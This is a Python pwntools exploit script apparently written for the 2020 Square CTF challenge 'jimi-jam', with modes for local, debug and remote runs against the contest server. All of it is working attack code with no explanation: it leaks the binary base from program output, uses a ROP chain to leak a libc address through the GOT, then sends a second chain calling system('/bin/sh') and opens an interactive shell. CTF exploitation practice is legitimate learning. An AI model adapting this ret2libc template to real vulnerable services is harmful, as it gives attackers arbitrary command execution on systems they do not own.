from pwn import *

binary = "./jimi-jam"
host ="challenges.2020.squarectf.com"
port = 9000
libc = "./libc.so.6"

elf = ELF(binary)
context.binary = binary
context.log_level = "debug"

breakpoints = []
commands = """
continue
"""

if len(sys.argv) >= 2 and sys.argv[1] == "r":
	# remote
	s = remote(host, port)
	libc = ELF(libc)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
	# debug
	s = gdb.debug(binary, commands,env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)
else:
	# local
	s = process(binary,env={"LD_PRELOAD": libc})
	# libc = elf.libc
	libc = ELF(libc)

s.recvuntil("The tour center is right here! ")
elf.address = int(s.recv(14),16) - elf.sym["ROPJAIL"]

pop_rdi = next(elf.search(asm("pop rdi; ret")))

log.info("base @ " + hex(elf.address))

payload = b"A" * 16
payload += p64(pop_rdi)
payload += p64(elf.got["read"])
payload += p64(elf.address+0x000010b0)
payload += p64(elf.sym["main"])

s.sendlineafter("Hey there! You're now in JIMI JAM JAIL\n",payload)

libc.address = int.from_bytes(s.recv(6),"little") - libc.sym["read"]
log.info("libc base @ " + hex(libc.address))

payload = b"A" * 16
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(next(elf.search(asm("ret"))))
payload += p64(libc.sym["system"])

s.sendlineafter("Hey there! You're now in JIMI JAM JAIL\n",payload)

sleep(1)
s.interactive()